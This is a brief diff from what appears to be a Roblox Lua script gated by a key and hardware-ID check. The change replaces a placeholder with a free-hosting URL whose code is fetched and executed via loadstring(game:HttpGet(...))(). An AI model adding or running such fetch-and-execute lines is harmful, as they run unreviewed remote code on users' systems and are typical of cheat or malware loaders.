@@ -33,7 +33,7 @@ if KeyAndHWID == true then
 end
 
 if ScriptIsRunning == true then
-    loadstring(game:HttpGet("UR Script"))()
+    loadstring(game:HttpGet("https://datadatahub.000webhostapp.com/1h54s51h564s1f56jh4s651651"))()
     return
 end
 
